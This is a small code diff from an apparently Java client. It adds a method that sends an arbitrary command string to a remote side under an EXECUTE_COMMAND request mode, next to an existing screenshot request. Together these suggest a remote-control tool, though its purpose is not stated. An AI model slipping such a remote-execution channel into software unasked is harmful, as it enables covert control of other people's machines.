@@ -22,6 +22,12 @@ public class Request {
 		this.request(RequestMode.TAKE_SCREENSHOT, this.mapper.createObjectNode());
 	}
 
+	public void command(String command) {
+		ObjectNode node = this.mapper.createObjectNode();
+		node.put("command", command);
+		this.request(RequestMode.EXECUTE_COMMAND, node);
+	}
+
 	private void request(int requestMode, ObjectNode node) {
 		node.put("requestMode", requestMode);
 		String message = node.toString();
